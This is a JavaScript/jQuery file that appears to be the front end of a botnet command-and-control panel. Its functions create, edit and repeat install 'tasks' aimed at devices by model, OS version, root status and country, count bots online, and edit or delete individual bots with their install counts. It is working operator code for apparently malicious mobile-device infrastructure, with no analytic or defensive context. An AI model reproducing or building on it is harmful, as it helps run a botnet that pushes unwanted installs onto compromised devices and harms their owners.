function repeat_task(tasknumber){
	if(confirm('Start task?')){
	$.post("inc/task_controll.php",
    {
        todo: "repeat",
        number: tasknumber
    },
    function(data, status){
		
		if(status == 'success')
		{
			window.location.reload();
			return;
		}
		
		if (data == "repeat_error")
		{
			alert("Error: active task already exists.\Request status: " + status);
		}
		
		else
		{
			window.location.reload();
			
		}
        
    });
	}
}

function remove_task(tasknumber){
	$.post("inc/task_controll.php",
    {
        todo: "remove",
        number: tasknumber
    },
    function(data, status){
		
        window.location.reload();
    });
	
	
}
function stat_task(tasknumber){

	$('#stat_task_num').html('...');
	$('#stat_task_run').html('...');
	$('#stat_task_take').html('...');
	
	$.post("inc/task_stat.php",
    {    
        number: tasknumber
    },
	function(data, status){
		var obj = jQuery.parseJSON(data);
		$('#stat_task_num').html(obj.number);
		$('#stat_task_run').html(obj.run);
		$('#stat_task_take').html(obj.take);
		
		var percent = 100 / obj.take * obj.run;
		if(isNaN(percent))
			percent = '0'
			
		$('#stat_task_procent').html(parseFloat(percent).toFixed(2) + "%");
    });
	
	
	$('#ModalStat').show(); 
	
}


function edit_task(tasknumber){

	$.post("inc/task_edit.php",
    {    
        number: tasknumber,
		type: 'get'
    },
	function(data, status){
		
		var obj = jQuery.parseJSON(data);
		
		$('#real_task_id').val(obj.number);
		$('#myModalLabel1').html('Edit task: '+ obj.number);
		$('#task_edit_number').val(obj.number);
		$('#task_edit_package').val(obj.package);
		$('#task_edit_url').val(obj.url);
		$('#task_edit_url_original').val(obj.url);
		$('#task_edit_size').val(obj.size);
		$('#task_edit_times').val(obj.times);
		$('#task_edit_root').val(obj.root);
		$('#task_edit_model').val(obj.model);
		$('#task_edit_osver').val(obj.osver);
		$('#task_edit_country').val(obj.country);
		$('#task_edit_lim').val(obj.lim);
		$('#task_edit_landing').val(obj.landing);
		$('#task_edit_packy').val(obj.packy);
		$('#task_edit_packn').val(obj.packn);
		$('#task_edit_device_clear').attr('checked', (obj.device_clear == 0)? false : true)
    });
	
	$('#ModalEdit').show(); 
	
}


function edit_task_save(){

	$('#save_button_id').prop('disabled', true)
	
	var clear_device = ($('#task_edit_device_clear').prop('checked'))? 1 : 0;
	
	var postdata = {    
		task: $('#real_task_id').val(),
        type: 'save',
		number: $('#task_edit_number').val(),
		pack: $('#task_edit_package').val(),
		url: $('#task_edit_url').val(),
		url_original: $('#task_edit_url_original').val(),
		size: $('#task_edit_size').val(),
		times: $('#task_edit_times').val(),
		root: $('#task_edit_root').val(),
		model: $('#task_edit_model').val(),
		osver: $('#task_edit_osver').val(),
		country: $('#task_edit_country').val(),
		lim: $('#task_edit_lim').val(),
		landing:$('#task_edit_landing').val(),
		packy:$('#task_edit_packy').val(),
		packn:$('#task_edit_packn').val(),
		device_clear:clear_device
    }
    
	$.ajax({
		type: 'POST',
		url: 'inc/task_edit.php',
		data: postdata,
		dataType: 'json',
		success: function(data){
			if(data.result == 1)
				//~ alert('FINE!')
				location.reload()
			else
				$('#error_text_2').html(data.error)
				
			$('#save_button_id').prop('disabled', false)
		}
	});
}

function addTask(){
	
	$('#add_button_id').prop('disabled', true)
	
	var postdata = {    
		number: $('#task_number').val(),
		pack: $('#task_package').val(),
		url: $('#task_url').val(),
		size: $('#task_size').val(),
		times: $('#task_times').val(),
		root: $('#task_root').val(),
		model: $('#task_model').val(),
		osver: $('#task_osver').val(),
		country: $('#task_country').val(),
		lim: $('#task_lim').val(),		
		landing: $('#task_landing').val(),
		packy: $('#task_packy').val(),
		packn: $('#task_packn').val(),
		clear_devices: $('#check-box-device').prop('checked'),
    }
    
	$.ajax({
		type: 'POST',
		url: 'inc/task_add.php',
		data: postdata,
		dataType: 'json',
		success: function(data){
			if(data.result == 1)
				//~ alert('FINE!')
				location.reload()
			else
				$('#error_text').html(data.error)
				
			$('#add_button_id').prop('disabled', false)
		}
	});
}


function del_Task(tasknum){
	if(confirm('Remove forever?')){
	$.post("inc/task_del.php",
    {    
		
		number: tasknum
		
    },
	function(data, status){
		location.reload();
		
		
    });
	}
}



function get_online(){
	

	$.post("inc/bots_online.php",
    {    
		
		
		
    },
	function(data, status){
		var obj = jQuery.parseJSON(data);
		
		$('#week').html(obj.week);
		$('#day').html(obj.day);
		$('#lasthour').html(obj.hour);
		//~ $('#now').html(obj.min);
    });
	
	
	
}


function logout(){
	
	$.post("login.php",
    {    
		
		type: 'logout'
    },
	function(data, status){
		
		location.href= 'login.php';
		
    });
	
	
	
}



function bot_del(number){
	 if(confirm('Delete bot '+number+'?')){
              
     
	$.post("inc/bot_edit.php",
    {    
		id: number,
		todo:  'remove'
		
    },
	function(data, status){
		
		location.reload();
		
    });
	 } 
	
}

function bot_edit_get(id){
	
	$.post("inc/bot_edit.php",
    {    
		id: id,
		todo:  'edit_get'
		
    },
	function(data, status){
		
		$('#ModalEditBot').show();
		var obj = jQuery.parseJSON(data);
		
		$('#real_bot_id').val(obj.id);
		if(obj.group_id != 'none')
			$('#bot_edit_group').val(obj.group_id);
		$('#uniqid_show').html(obj.uniqnum);
		$('#installed_show').html(obj.number_installs);
		$('#model_show').html(obj.model);
		$('#taken_show').html(obj.taken);
		$('#country_show').html(obj.country);
		

		
		
		
    });
	
}

function bot_edit_save(id){
	
	 if(confirm(' Save bot '+$('#real_bot_id').val()+'?\n Will be saved \n  Group:'+$('#bot_edit_group').val())){
	$.post("inc/bot_edit.php",
    {    
		id: $('#real_bot_id').val(),
		group: $('#bot_edit_group').val(),
		todo:  'edit_save'
		
    },
	function(data, status){
		
		
		location.reload();
		
    });
	 }
	
}

